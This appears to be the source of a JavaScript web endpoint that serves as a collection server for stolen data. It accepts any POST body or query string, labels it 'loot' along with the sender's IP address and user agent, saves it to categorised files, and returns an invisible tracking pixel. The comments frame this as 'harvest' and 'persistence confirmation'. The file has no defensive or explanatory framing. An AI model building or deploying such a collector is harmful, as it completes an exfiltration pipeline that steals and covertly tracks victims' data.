import { writeFileSync } from 'fs';

export default async function handler(req, res) {
    if (req.method !== 'POST' && req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const data = req.method === 'POST' ? await req.body : { raw: req.nextUrl.searchParams.toString() };
        
        const loot = {
            ...data,
            ip: req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown',
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toISOString()
        };

        // Categorize loot
        const category = data.type || 'unknown';
        const filename = `loot_${category}_${Date.now()}.json`;
        writeFileSync(`./loot/${filename}`, JSON.stringify(loot, null, 2));

        // Respond with invisible pixel (persistence confirmation)
        const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
        res.setHeader('Content-Type', 'image/gif');
        res.setHeader('Cache-Control', 'no-cache');
        res.status(200).send(pixel);

    } catch (error) {
        res.status(500).json({ error: 'Harvest failed' });
    }
}
